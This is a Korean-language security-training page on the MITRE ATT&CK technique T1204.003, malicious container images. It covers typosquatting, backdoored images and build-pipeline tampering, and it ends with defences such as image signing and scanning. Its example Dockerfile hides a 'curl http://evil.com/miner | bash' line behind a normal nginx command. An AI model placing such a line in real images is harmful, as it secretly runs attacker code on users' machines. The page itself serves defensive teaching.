T1204.003: Malicious Image

Execution

Malicious Image

악성 코드가 포함된 컨테이너/VM 이미지를 배포하여 코드 실행

#1. 개념과 원리

악성 이미지란?

Docker Hub, ECR 등 공개 레지스트리에 악성 코드가 포함된 컨테이너 이미지를 등록하거나, 정상 이미지를 변조하여 배포합니다. 사용자가 해당 이미지를 pull/run 하면 악성 코드가 실행됩니다. 암호화폐 채굴, 백도어, 자격증명 탈취 등에 활용됩니다.

타이포스쿼팅

정상 이미지와 유사한 이름의 악성 이미지 등록

백도어 이미지

정상 기능 + 숨겨진 악성 코드 포함

이미지 변조

빌드 파이프라인에서 정상 이미지에 악성 레이어 추가

#2. 공격 기법 분석

# Docker Hub에서 타이포스쿼팅 이미지
docker pull ngimx # nginx가 아닌 ngimx
# 악성 이미지 내부 (Dockerfile)
FROM ubuntu:22.04
RUN apt-get install -y curl
RUN curl -s http://evil.com/miner | bash
CMD ["nginx", "-g", "daemon off;"]
// 정상 기능 + 숨겨진 채굴기

공격 분석

  • 타이포스쿼팅: nginx -> ngimx 등 유사 이름 악성 이미지
  • 백도어 삽입: 정상 이미지에 채굴기/C2 에이전트 추가
  • 레지스트리 탈취: 사설 레지스트리 접근하여 이미지 교체
  • 빌드 파이프라인: CI/CD에서 이미지 빌드 과정에 악성 코드 주입

#3. 탐지 및 방어 + 퀴즈

방어 전략

  • 이미지 서명: Cosign/Notary로 이미지 무결성 검증
  • 이미지 스캐닝: Trivy, Grype로 CVE/악성코드 검사
  • Admission Controller: 서명/스캔 미통과 이미지 배포 차단
  • 사설 레지스트리: 승인된 이미지만 사설 레지스트리에서 사용
  • 베이스 이미지 관리: 승인된 베이스 이미지만 사용 허용
